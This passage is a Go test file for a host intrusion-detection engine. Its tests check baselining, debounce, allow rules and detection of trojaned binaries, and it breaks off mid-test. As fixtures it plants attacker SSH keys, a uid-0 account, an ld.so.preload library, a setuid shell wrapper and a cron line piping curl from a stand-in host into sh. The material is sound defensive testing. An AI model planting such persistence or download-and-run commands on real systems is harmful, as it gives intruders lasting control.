package detect

import (
	"context"
	"crypto/md5"
	"encoding/hex"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/Problem99-io/kodeblue/internal/blue/sensors"
	"github.com/Problem99-io/kodeblue/internal/blue/store"
)

func write(t *testing.T, root, path, content string) {
	t.Helper()
	full := filepath.Join(root, path)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func setup(t *testing.T) (string, *sensors.Env, *store.Store, *sensors.Registry, *Detector) {
	// Resolved, so the integrity collector's symlink handling maps paths
	// back under it (macOS's temp dir is behind /var -> /private/var).
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	write(t, root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n")
	write(t, root, "/etc/group", "sudo:x:27:alice\n")
	write(t, root, "/home/alice/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaKEYALICE alice@laptop\n")
	write(t, root, "/etc/crontab", "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
	st, err := store.Open(filepath.Join(t.TempDir(), "kb.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	env := &sensors.Env{Root: root}
	env.Pkg = sensors.LoadPackageIndex(env)
	reg := sensors.NewRegistry([]string{"account", "ssh_key", "persistence"}, nil)
	d := New(st, env, DefaultOptions())
	return root, env, st, reg, d
}

func sweep(t *testing.T, d *Detector, reg *sensors.Registry, env *sensors.Env, mode Mode) Result {
	t.Helper()
	res, err := d.Process(reg.Sweep(context.Background(), env, true), mode)
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func TestLearnThenQuiet(t *testing.T) {
	_, env, _, reg, d := setup(t)
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 0 || r.Absorbed == 0 {
		t.Fatalf("learning should absorb silently: %+v", r)
	}
	for i := 0; i < 3; i++ {
		if r := sweep(t, d, reg, env, ModeDetect); len(r.New) != 0 || r.Pending != 0 {
			t.Fatalf("unchanged host must produce nothing: %+v", r)
		}
	}
}

func TestRootKeyIsInstantCritical(t *testing.T) {
	root, env, _, reg, d := setup(t)
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/root/.ssh/authorized_keys", "ssh-rsa AAAAB3EVIL attacker\n")
	r := sweep(t, d, reg, env, ModeDetect)
	if len(r.New) != 1 || r.New[0].Severity != SevCritical || r.New[0].Rule != "ssh_key.added" {
		t.Fatalf("want one critical ssh_key.added, got %+v", r.New)
	}
	if r.New[0].Evidence["protected"] != "true" {
		t.Fatal("ssh key findings must be protected")
	}
	// Repeat observation is counted, not re-reported.
	if r := sweep(t, d, reg, env, ModeDetect); len(r.New) != 0 || r.Bumped != 1 {
		t.Fatalf("repeat should bump: %+v", r)
	}
}

// Keys already in root's authorized_keys at install are the admins' keys:
// learning takes them into the baseline instead of opening a critical
// incident per key. A root key that appears later, while learning goes on or
// after it, is still an instant critical.
func TestLearningAbsorbsPreexistingRootKeys(t *testing.T) {
	root, env, st, reg, d := setup(t)
	write(t, root, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3ADMIN1 ops@bastion\nssh-ed25519 AAAAC3ADMIN2 deploy@ci\n")
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 0 {
		t.Fatalf("pre-existing root keys must be learned, not flagged: %+v", r.New)
	}
	keys := 0
	for _, b := range st.QueryBaseline("ssh_key", "root/", 10) {
		if b.Source != "learned" {
			t.Errorf("root key %s has source %q, want learned", b.Key, b.Source)
		}
		keys++
	}
	if keys != 2 {
		t.Fatalf("want both root keys in the baseline, got %d", keys)
	}
	write(t, root, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3ADMIN1 ops@bastion\nssh-ed25519 AAAAC3ADMIN2 deploy@ci\nssh-rsa AAAAB3EVIL1 attacker\n")
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 1 || r.New[0].Rule != "ssh_key.added" || r.New[0].Severity != SevCritical {
		t.Fatalf("a root key added during learning must still be flagged: %+v", r.New)
	}
	write(t, root, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3ADMIN1 ops@bastion\nssh-ed25519 AAAAC3ADMIN2 deploy@ci\nssh-rsa AAAAB3EVIL1 attacker\nssh-rsa AAAAB3EVIL2 attacker2\n")
	if r := sweep(t, d, reg, env, ModeDetect); len(r.New) != 1 || r.New[0].Severity != SevCritical || r.New[0].Rule != "ssh_key.added" {
		t.Fatalf("a root key added after learning must be an instant critical: %+v", r.New)
	}
}

// Only the first learning sweep learns keys as the admins'. A key read first
// on a later sweep is flagged: one planted during learning, or one a
// collector that failed on the first sweep reads later. Login history seeded
// into the baseline before that sweep (as the daemon does) changes nothing.
func TestFirstKeysWindowDoesNotReopen(t *testing.T) {
	root, env, _, reg, d := setup(t)
	// The daemon seeds login history before the first sweep, as here.
	if _, err := d.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "alice", "198.51.100.21", time.Now())}}, ModeLearn); err != nil {
		t.Fatal(err)
	}
	write(t, root, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3ADMIN1 ops@bastion\n")
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 0 {
		t.Fatalf("keys at install must be learned with seeded logins in the baseline: %+v", r.New)
	}
	write(t, root, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3ADMIN1 ops@bastion\nssh-rsa AAAAB3EVIL1 attacker\n")
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 1 || r.New[0].Severity != SevCritical {
		t.Fatalf("a key planted during learning must be flagged: %+v", r.New)
	}

	// The ssh_key collector fails on the first sweep and reads the keys later.
	root, env, _, reg, d = setup(t)
	write(t, root, "/root/.ssh/authorized_keys", "ssh-rsa AAAAB3EVIL2 attacker\n")
	snap := reg.Sweep(context.Background(), env, true)
	var items []sensors.Item
	for _, it := range snap.Items {
		if it.Collector != "ssh_key" {
			items = append(items, it)
		}
	}
	snap.Items, snap.Ran = items, slices.DeleteFunc(snap.Ran, func(c string) bool { return c == "ssh_key" })
	if _, err := d.Process(snap, ModeLearn); err != nil {
		t.Fatal(err)
	}
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 1 || r.New[0].Rule != "ssh_key.added" {
		t.Fatalf("a key first read after the first sweep must be flagged: %+v", r.New)
	}
}

func TestDebounceDropsTransientChange(t *testing.T) {
	root, env, _, reg, d := setup(t)
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
	if r := sweep(t, d, reg, env, ModeDetect); len(r.New) != 0 || r.Pending != 1 {
		t.Fatalf("first observation should only be pending: %+v", r)
	}
	os.Remove(filepath.Join(root, "/etc/cron.d/backup"))
	if r := sweep(t, d, reg, env, ModeDetect); len(r.New) != 0 {
		t.Fatalf("transient change must never become a finding: %+v", r)
	}
	// Persistent change does.
	write(t, root, "/etc/cron.d/miner", "* * * * * root /tmp/.x/run\n")
	sweep(t, d, reg, env, ModeDetect)
	r := sweep(t, d, reg, env, ModeDetect)
	if len(r.New) != 1 || r.New[0].Rule != "persistence.autorun" {
		t.Fatalf("persistent cron entry should be reported after debounce: %+v", r.New)
	}
}

func TestUID0AndAllowRules(t *testing.T) {
	root, env, st, reg, d := setup(t)
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\ntoor:x:0:0::/root:/bin/bash\n")
	r := sweep(t, d, reg, env, ModeDetect)
	if len(r.New) != 1 || r.New[0].Rule != "account.uid0" || r.New[0].Severity != SevCritical {
		t.Fatalf("uid0 account must be instant critical: %+v", r.New)
	}
	// A non-operator allow rule must not suppress a protected detection.
	_ = st.AddAllowRule(&store.AllowRule{Collector: "persistence", KeyPattern: "/etc/cron.d/deploy-*", Reason: "deploy tool rotates its cron file", CreatedBy: "agent"})
	write(t, root, "/etc/cron.d/deploy-123", "*/5 * * * * deploy /srv/app/bin/tick\n")
	r = sweep(t, d, reg, env, ModeDetect)
	if len(r.New) != 0 || r.Allowed != 1 {
		t.Fatalf("matching allow rule should absorb a non-protected change: %+v", r)
	}
}

func TestMaintenanceAbsorbsButNotCritical(t *testing.T) {
	root, env, _, reg, d := setup(t)
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/etc/cron.d/newjob", "0 1 * * * root /usr/bin/true\n")
	write(t, root, "/etc/ld.so.preload", "/lib/x86_64-linux-gnu/libevil.so\n")
	r := sweep(t, d, reg, env, ModeMaintenance)
	if len(r.New) != 1 || r.New[0].Rule != "persistence.ld_preload" {
		t.Fatalf("maintenance must still report critical: %+v", r.New)
	}
}

func TestGlob(t *testing.T) {
	cases := []struct {
		p, s string
		ok   bool
	}{
		{"/srv/app/releases/*/bin/app@deploy", "/srv/app/releases/2026-10-19/bin/app@deploy", true},
		{"/srv/app/releases/*/bin/app@deploy", "/tmp/app@deploy", false},
		{"tcp/8?80/*", "tcp/8080/public/x", true},
	}
	for _, c := range cases {
		if Glob(c.p, c.s) != c.ok {
			t.Errorf("Glob(%q,%q) != %v", c.p, c.s, c.ok)
		}
	}
	if GlobBreadth("*") != 0 || GlobBreadth("/srv/*") != 5 {
		t.Error("GlobBreadth")
	}
}

func authEv(kind, user, ip string, at time.Time) sensors.Event {
	return sensors.Event{Collector: "auth", Kind: kind, Time: at, Subject: user, Message: kind + " " + user + " " + ip, Attrs: map[string]string{"user": user, "ip": ip, "method": "password"}}
}

// An attacker's login must never teach kodeblue that its source is normal:
// only a benign verdict (here: the operator acking the finding) does.
func TestFlaggedLoginSourceIsNotLearned(t *testing.T) {
	_, _, st, _, d := setup(t)
	now := time.Now()
	var evs []sensors.Event
	for i := 0; i < 25; i++ {
		evs = append(evs, authEv("login_failure", "root", "203.0.113.66", now))
	}
	evs = append(evs, authEv("login_success", "root", "203.0.113.66", now))
	r, err := d.Process(sensors.Snapshot{Events: evs}, ModeDetect)
	var login *store.Finding
	for _, f := range r.New {
		if f.Rule == "auth.success_after_bruteforce" {
			login = f
		}
	}
	if err != nil || login == nil {
		t.Fatalf("want a success_after_bruteforce finding, got %v %+v", err, r.New)
	}
	if b, _ := st.Baseline(); b["auth_known|login/root@203.0.113.66"] != nil || b["auth_known|login/root@203.0.113.0/24"] != nil {
		t.Fatal("attacker source was learned as known")
	}
	if login.ItemID != "auth_known|login/root@203.0.113.66" {
		t.Fatalf("finding must carry the item a benign verdict would learn, got %q", login.ItemID)
	}
	// A later quiet login from the same IP is still a new source.
	d2 := New(st, d.env, DefaultOptions())
	r, _ = d2.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "root", "203.0.113.66", now.Add(time.Hour))}}, ModeDetect)
	if len(r.New) != 1 || r.New[0].Rule != "auth.new_login_source" {
		t.Fatalf("re-entry from the attacker IP must alert, got %+v", r.New)
	}
	// Known sources (learned at install) stay quiet.
	_, _ = d2.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "alice", "198.51.100.21", now)}}, ModeLearn)
	r, _ = d2.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "alice", "198.51.100.40", now.Add(time.Hour))}}, ModeDetect)
	if len(r.New) != 0 {
		t.Fatalf("same /24 as a learned source should be quiet, got %+v", r.New)
	}
	// The same /48 in another spelling is the same network.
	_, _ = d2.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "alice", "2001:db8::10", now)}}, ModeLearn)
	r, _ = d2.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "alice", "2001:db8:0:5::1", now.Add(time.Hour))}}, ModeDetect)
	if len(r.New) != 0 {
		t.Fatalf("same /48 as a learned source should be quiet, got %+v", r.New)
	}
	r, _ = d2.Process(sensors.Snapshot{Events: []sensors.Event{authEv("login_success", "alice", "2001:db8:abcd::7", now.Add(time.Hour))}}, ModeDetect)
	if len(r.New) != 1 || r.New[0].Rule != "auth.new_login_source" {
		t.Fatalf("another /48 is a new source, got %+v", r.New)
	}
}

func TestIPPrefix(t *testing.T) {
	for in, want := range map[string]string{
		// IPv4 keys keep the format stored baselines already use.
		"198.51.100.21":         "198.51.100.0/24",
		"10.0.0.255":            "10.0.0.0/24",
		"::ffff:198.51.100.21":  "198.51.100.0/24",
		"2001:db8::1":           "2001:db8::/48",
		"2001:db8:0:5::1":       "2001:db8::/48",
		"2001:0db8:0000::2":     "2001:db8::/48",
		"2001:db8:abcd:12::1":   "2001:db8:abcd::/48",
		"2001:db8:abcd:ffff::9": "2001:db8:abcd::/48",
		"fe80::1%eth0":          "fe80::1%eth0", // not a plain address: kept as is
		"unknown":               "unknown",
	} {
		if got := ipPrefix(in); got != want {
			t.Errorf("ipPrefix(%q) = %q, want %q", in, got, want)
		}
	}
}

// A maintenance window absorbs planned changes, but never an item that an
// open finding is about.
func TestMaintenanceKeepsItemsUnderInvestigation(t *testing.T) {
	root, env, st, reg, d := setup(t)
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/etc/cron.d/backdoor", "* * * * * root /tmp/x\n")
	var f *store.Finding
	for i := 0; i < 3 && f == nil; i++ {
		if r := sweep(t, d, reg, env, ModeDetect); len(r.New) > 0 {
			f = r.New[0]
		}
	}
	if f == nil {
		t.Fatal("cron drop not detected")
	}
	_ = st.SetFindingStatus(f.ID, "incident", "true_positive", "attack", 1)
	write(t, root, "/etc/cron.d/backdoor", "*/5 * * * * root /tmp/x --changed\n")
	sweep(t, d, reg, env, ModeMaintenance)
	sweep(t, d, reg, env, ModeMaintenance)
	if b, _ := st.Baseline(); b[f.ItemID] != nil {
		t.Fatal("maintenance absorbed an item under investigation")
	}
	// The same path seen by another sensor counts too (a dropped binary is
	// both a tmp_exec item and a running process).
	pf := &store.Finding{Fingerprint: "p", Collector: "process", Rule: "process.world_writable", Severity: SevHigh, Title: "x", ItemID: "process|/var/tmp/.x/kworker@root"}
	_ = st.AddFinding(pf)
	_ = st.SetFindingStatus(pf.ID, "closed", "true_positive", "attack", 0)
	if !st.ItemUnsettled("tmp_exec|/var/tmp/.x/kworker") || st.ItemUnsettled("tmp_exec|/var/tmp/other") {
		t.Fatal("path-based match across collectors is wrong")
	}
	// Unrelated planned work is still absorbed.
	write(t, root, "/etc/cron.d/logrotate-extra", "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n")
	if r := sweep(t, d, reg, env, ModeMaintenance); r.Absorbed == 0 {
		t.Fatalf("planned change not absorbed: %+v", r)
	}
}

// scheduled runs a normal daemon sweep: collectors keep their cadence.
func scheduled(t *testing.T, d *Detector, reg *sensors.Registry, env *sensors.Env, mode Mode) Result {
	t.Helper()
	res, err := d.Process(reg.Sweep(context.Background(), env, false), mode)
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func slowSetup(t *testing.T, collectors ...string) (string, *sensors.Env, *store.Store, *sensors.Registry, *Detector) {
	root, env, st, _, d := setup(t)
	return root, env, st, sensors.NewRegistry(collectors, nil), d
}

func findRule(rs []Result, rule string) *store.Finding {
	for _, r := range rs {
		for _, f := range r.New {
			if f.Rule == rule {
				return f
			}
		}
	}
	return nil
}

// Collectors that skip sweeps (tmp_exec every 2, suid every 10) must still
// confirm a debounced change: debounce counts their runs, not sweeps.
func TestDebounceSlowCollectorsWithoutForce(t *testing.T) {
	root, env, _, reg, d := slowSetup(t, "tmp_exec", "suid")
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/tmp/.x/payload", "\x7fELF\x02\x01\x01 not really a binary")
	if err := os.Chmod(filepath.Join(root, "/tmp/.x/payload"), 0o755); err != nil {
		t.Fatal(err)
	}
	write(t, root, "/usr/local/bin/helper", "#!/bin/sh\nexec /bin/sh -p\n")
	if err := os.Chmod(filepath.Join(root, "/usr/local/bin/helper"), 0o755|os.ModeSetuid); err != nil {
		t.Fatal(err)
	}
	var rs []Result
	for i := 0; i < 25; i++ {
		rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
	}
	if f := findRule(rs, "tmp_exec.elf"); f == nil {
		t.Fatalf("ELF dropped in /tmp never reported over 25 scheduled sweeps")
	}
	if f := findRule(rs, "suid.new"); f == nil || f.Severity != SevHigh {
		t.Fatalf("new unpackaged setuid file never reported over 25 scheduled sweeps: %+v", f)
	}
}

func TestDebounceSlowCollectorDropsTransient(t *testing.T) {
	root, env, _, reg, d := slowSetup(t, "tmp_exec", "persistence")
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/tmp/build/cc1", "\x7fELF short-lived compiler")
	_ = os.Chmod(filepath.Join(root, "/tmp/build/cc1"), 0o755)
	var rs []Result
	// Seen by one tmp_exec run, then gone before the next.
	for i := 0; i < 2; i++ {
		rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
	}
	_ = os.RemoveAll(filepath.Join(root, "/tmp/build"))
	for i := 0; i < 6; i++ {
		rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
	}
	if f := findRule(rs, "tmp_exec.elf"); f != nil {
		t.Fatalf("transient file seen by one collector run became a finding: %+v", f)
	}
	if len(d.pending) != 0 {
		t.Fatalf("debounce state left behind: %v", d.pending)
	}
}

func TestSelfExemptionIsExact(t *testing.T) {
	_, env, st, _, _ := setup(t)
	opts := DefaultOptions()
	opts.SelfExes = []string{"/usr/local/bin/kodeblue", "/usr/local/lib/kodeblue/engine", "kodeblue-engine"}
	d := New(st, env, opts)
	cases := []struct {
		it   sensors.Item
		self bool
	}{
		{sensors.Item{Collector: "process", Key: "/usr/local/bin/kodeblue@kodeblue"}, true},
		{sensors.Item{Collector: "process", Key: "/usr/local/lib/kodeblue/engine@kodeblue"}, true},
		{sensors.Item{Collector: "cpu_hog", Key: "/usr/local/bin/kodeblue@kodeblue"}, true},
		{sensors.Item{Collector: "listener", Key: "tcp/7070/loopback//usr/local/bin/kodeblue"}, true},
		{sensors.Item{Collector: "outbound", Key: "/usr/local/lib/kodeblue/engine->443"}, true},
		{sensors.Item{Collector: "process", Key: "/dev/shm/usr/local/bin/kodeblue@root", Attrs: map[string]string{"suspicious_location": "world-writable dir"}}, false},
		{sensors.Item{Collector: "process", Key: "/dev/shm/usr/local/bin/kodeblue@root"}, false},
		{sensors.Item{Collector: "process", Key: "/memfd:/usr/local/bin/kodeblue@root"}, false},
		{sensors.Item{Collector: "process", Key: "/usr/local/bin/kodeblue@root", Attrs: map[string]string{"deleted": "true"}}, false},
		{sensors.Item{Collector: "process", Key: "/usr/local/bin/kodeblue (deleted)@root"}, false},
		{sensors.Item{Collector: "process", Key: "/usr/local/bin/kodeblue2@root"}, false},
		{sensors.Item{Collector: "process", Key: "/opt/x/kodeblue-engine@root"}, false},
		{sensors.Item{Collector: "listener", Key: "tcp/4444/public//tmp/usr/local/bin/kodeblue"}, false},
		{sensors.Item{Collector: "outbound", Key: "/tmp/usr/local/bin/kodeblue->4444"}, false},
		{sensors.Item{Collector: "outbound", Key: "/usr/local/bin/kodeblue->443/usr/bin/nc->4444"}, false},
		{sensors.Item{Collector: "tmp_exec", Key: "/usr/local/bin/kodeblue"}, false},
	}
	for _, c := range cases {
		if got := d.isSelf(c.it); got != c.self {
			t.Errorf("isSelf(%s %q) = %v, want %v", c.it.Collector, c.it.Key, got, c.self)
		}
	}
	// End to end: the impostor in /dev/shm is reported.
	r, err := d.Process(sensors.Snapshot{Ran: []string{"process"}, Items: []sensors.Item{
		{Collector: "process", Key: "/dev/shm/usr/local/bin/kodeblue@root", Attrs: map[string]string{"suspicious_location": "world-writable dir"}},
		{Collector: "process", Key: "/usr/local/bin/kodeblue@kodeblue", Attrs: map[string]string{}},
	}}, ModeDetect)
	if err != nil || len(r.New) != 1 || r.New[0].Rule != "process.suspicious_location" {
		t.Fatalf("want only the /dev/shm impostor reported, got %v %+v", err, r.New)
	}
}

func md5hex(s string) string {
	h := md5.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}

// dpkgHost writes a minimal dpkg database owning /usr/sbin/sshd.
func dpkgHost(t *testing.T, root, version, sshd string) {
	t.Helper()
	write(t, root, "/usr/sbin/sshd", sshd)
	write(t, root, "/var/lib/dpkg/status", "Package: openssh-server\nStatus: install ok installed\nVersion: "+version+"\n\n")
	write(t, root, "/var/lib/dpkg/info/openssh-server.list", "/.\n/usr\n/usr/sbin\n/usr/sbin/sshd\n")
	write(t, root, "/var/lib/dpkg/info/openssh-server.md5sums", md5hex(sshd)+"  usr/sbin/sshd\n")
}

func pkgSetup(t *testing.T) (string, *sensors.Env, *sensors.Registry, *Detector) {
	root, env, _, _, d := setup(t)
	dpkgHost(t, root, "1:9.6p1-3ubuntu13", "sshd original bytes")
	env.Pkg = sensors.LoadPackageIndex(env)
	reg := sensors.NewRegistry([]string{"integrity", "package"}, nil)
	if r := sweep(t, d, reg, env, ModeLearn); len(r.New) != 0 {
		t.Fatalf("clean dpkg host should learn quietly: %+v", r.New)
	}
	return root, env, reg, d
}

// Root trojans sshd and rewrites its md5sums line (and forges a dpkg.log
// entry): the checksum "verifies", but no upgrade explains the change.
func TestTrojanWithForgedChecksumsIsReported(t *testing.T) {
	root, env, reg, d := pkgSetup(t)
	trojan := "sshd with a backdoor"
	write(t, root, "/usr/sbin/sshd", trojan)
	write(t, root, "/var/lib/dpkg/info/openssh-server.md5sums", md5hex(trojan)+"  usr/sbin/sshd\n")
	write(t, root, "/var/log/dpkg.log", time.Now().Add(-time.Minute).Format("2006-01-02 15:04:05")+" upgrade openssh-server:amd64 1:9.6p1-3ubuntu13 1:9.6p1-3ubuntu13\n")
	env.Pkg = sensors.LoadPackageIndex(env) // e.g. the daemon restarted
	if !env.Pkg.Verify(env, "/usr/sbin/sshd") {
		t.Fatal("test setup: forged md5sums should verify")
	}
	var rs []Result
	for i := 0; i < 12; i++ {
		rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
	}
	f := findRule(rs, "integrity.changed")
	if f == nil || f.Severity != SevHigh || f.Evidence["package_verified"] != "unexplained" || f.Evidence["explained_by"] != "" {
		t.Fatalf("trojaned sshd with forged md5sums must be a high integrity.changed, got %+v", f)
	}
	if f := findRule(rs, "package.checksums_changed"); f == nil || f.Evidence["protected"] != "true" {
		t.Fatalf("md5sums rewritten without a version change must be reported, got %+v", f)
	}
}

func TestPackageUpgradeIsAbsorbed(t *testing.T) {
	root, env, reg, d := pkgSetup(t)
	dpkgHost(t, root, "1:9.6p1-3ubuntu13.5", "sshd security update bytes")
	write(t, root, "/var/log/dpkg.log", time.Now().Add(-time.Minute).Format("2006-01-02 15:04:05")+" upgrade openssh-server:amd64 1:9.6p1-3ubuntu13 1:9.6p1-3ubuntu13.5\n")
	env.Pkg.Refresh(env)
	for i := 0; i < 12; i++ {
		if r := scheduled(t, d, reg, env, ModeDetect); len(r.New) != 0 {
			t.Fatalf("a real package upgrade must be absorbed: %+v", r.New)
		}
	}
	b, _ := d.st.Baseline()
	if v := b["package|openssh-server"]; v == nil || packageVersion(v.Value) != "1:9.6p1-3ubuntu13.5" || packageSums(v.Value) == "" {
		t.Fatalf("package baseline not updated: %+v", v)
	}
}

// A forged dpkg.log line alone must not lower a finding's severity.
func TestForgedPackageLogDoesNotDowngrade(t *testing.T) {
	root, env, _, _, d := setup(t)
	write(t, root, "/var/lib/dpkg/status", "Package: cron\nStatus: install ok installed\nVersion: 3.0\n\n")
	write(t, root, "/var/lib/dpkg/info/cron.list", "/etc/cron.d/e2scrub_all\n")
	write(t, root, "/etc/cron.d/e2scrub_all", "30 3 * * 0 root test -e /run/systemd/system || /sbin/e2scrub_all\n")
	env.Pkg = sensors.LoadPackageIndex(env)
	reg := sensors.NewRegistry([]string{"persistence", "package"}, nil)
	sweep(t, d, reg, env, ModeLearn)
	write(t, root, "/etc/cron.d/e2scrub_all", "* * * * * root curl -s http://203.0.113.9/x | sh\n")
	write(t, root, "/var/log/dpkg.log", time.Now().Add(-time.Minute).Format("2006-01-02 15:04:05")+" upgrade cron:amd64 3.0 3.0\n")
	var rs []Result
	for i := 0; i < 3; i++ {
		rs = append(rs, sweep(t, d, reg, env, ModeDetect))
	}
	f := findRule(rs, "persistence.autorun")
	if f == nil || f.Severity != SevMedium || f.Evidence["explained_by"] != "" {
		t.Fatalf("forged dpkg.log must not explain the change away, got %+v", f)
	}
}

func TestCheckAllowPattern(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "/usr/local/bin"), 0o755)
	_ = os.MkdirAll(filepath.Join(root, "/etc/cron.d"), 0o755)
	env := &sensors.Env{Root: root}
	bad := []string{
		"", "*", "*/etc/cron.d/x", "?etc/cron.d/x", "/etc/*",
		"/etc/cron.d/*", "/usr/local/bin/*", "/etc/systemd/system/*.service", "/etc/cron.d/?x",
		"/usr/local/bi*", "/usr/local/bin*", "/srv/*/deploy-*", "/usr/local/bin/k*",
		"/*/cron-update", "/*/kworkerd@root", "/etc/*/deploy-*", "/etc/cron.d/../*x",
	}
	for _, p := range bad {
		if CheckAllowPattern(env, p) == nil {
			t.Errorf("pattern %q accepted, want rejected", p)
		}
	}
	good := []string{
		"/etc/cron.d/deploy-*", "/srv/app/releases/*/bin/app@deploy", "/usr/bin/python3->*",
		"/usr/local/bin/backup-runner", "tcp/8080/public//srv/app/bin/server", "ubuntu/nginx:1.27#web",
	}
	for _, p := range good {
		if err := CheckAllowPattern(env, p); err != nil {
			t.Errorf("pattern %q rejected: %v", p, err)
		}
	}
	// The directory check needs the filesystem; the static checks do not.
	if CheckAllowPattern(nil, "/usr/local/bin/*") == nil || CheckAllowPattern(nil, "/etc/cron.d/deploy-*") != nil {
		t.Error("static checks must not depend on env")
	}
}

// A bind mount or separate mount namespace can make an impostor's exe path
// read as kodeblue's. Identity must come from the real inode behind
// /proc/<pid>/exe, not the path string.
func TestSelfExemptionByInode(t *testing.T) {
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	write(t, root, "/opt/kb/kodeblue", "real kodeblue bytes")
	write(t, root, "/opt/evil/nc", "netcat impostor")
	// /proc/<pid>/exe symlinks: the real process resolves to kodeblue, the
	// impostor's (same apparent path, different file) to nc.
	mkexe := func(pid, target string) {
		d := filepath.Join(root, "proc", pid)
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(filepath.Join(root, target), filepath.Join(d, "exe")); err != nil {
			t.Fatal(err)
		}
	}
	mkexe("100", "/opt/kb/kodeblue")
	mkexe("200", "/opt/evil/nc")
	st, err := store.Open(filepath.Join(t.TempDir(), "kb.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	env := &sensors.Env{Root: root}
	env.Pkg = sensors.LoadPackageIndex(env)
	opts := DefaultOptions()
	opts.SelfExes = []string{"/opt/kb/kodeblue"}
	d := New(st, env, opts)
	// Same path string for both; only the inode differs.
	self := sensors.Item{Collector: "process", Key: "/opt/kb/kodeblue@kodeblue", Attrs: map[string]string{"pid": "100"}}
	impostor := sensors.Item{Collector: "listener", Key: "tcp/4444/public//opt/kb/kodeblue", Attrs: map[string]string{"pid": "200"}}
	if !d.isSelf(self) {
		t.Error("kodeblue's own process (matching inode) must be exempt")
	}
	if d.isSelf(impostor) {
		t.Error("INODE BYPASS: impostor whose path reads as kodeblue but inode differs was exempted")
	}
	// A pid that no longer exists is not us.
	gone := sensors.Item{Collector: "process", Key: "/opt/kb/kodeblue@kodeblue", Attrs: map[string]string{"pid": "999"}}
	if d.isSelf(gone) {
		t.Error("unresolvable pid must not be exempt")
	}
}

// A hub-started upgrade runs `kodeblue upgrade` as root in its own unit, and
// the installer swaps the binary under it. That process is kodeblue, not a
// "process running from a deleted executable"; the same thing anywhere else
// still is.
func TestUpgradeProcessFromReplacedBinary(t *testing.T) {
	_, env, st, _, _ := setup(t)
	opts := DefaultOptions()
	opts.SelfExes = []string{"/usr/local/bin/kodeblue"}
	d := New(st, env, opts)
	item := func(key, unit string, extra ...string) sensors.Item {
		a := map[string]string{"deleted": "true", "pid": "4242", "ppid": "1"}
		if unit != "" {
			a["unit"] = unit
		}
		for i := 0; i+1 < len(extra); i += 2 {
			a[extra[i]] = extra[i+1]
		}
		return sensors.Item{Collector: "process", Key: key, Attrs: a}
	}
	upgrading := item("/usr/local/bin/kodeblue@root", "kodeblue-upgrade.service")
	cases := []struct {
		name string
		it   sensors.Item
		self bool
	}{
		{"the upgrade", upgrading, true},
		{"no unit", item("/usr/local/bin/kodeblue@root", ""), false},
		{"another unit", item("/usr/local/bin/kodeblue@root", "kodeblue.service"), false},
		{"a look-alike unit", item("/usr/local/bin/kodeblue@root", "kodeblue-upgrade.service.evil"), false},
		{"not root", item("/usr/local/bin/kodeblue@kodeblue", "kodeblue-upgrade.service"), false},
		{"another binary", item("/usr/bin/nc@root", "kodeblue-upgrade.service"), false},
		{"a look-alike path", item("/usr/local/bin/kodeblue2@root", "kodeblue-upgrade.service"), false},
		{"suspicious location", item("/usr/local/bin/kodeblue@root", "kodeblue-upgrade.service", "suspicious_location", "memfd"), false},
		{"not deleted", sensors.Item{Collector: "process", Key: "/usr/local/bin/kodeblue@root", Attrs: map[string]string{"unit": "kodeblue-upgrade.service"}}, false},
	}
	for _, c := range cases {
		if got := d.isSelfUpgrade(c.it); got != c.self {
			t.Errorf("%s: isSelfUpgrade(%q %v) = %v, want %v", c.name, c.it.Key, c.it.Attrs, got, c.self)
		}
	}

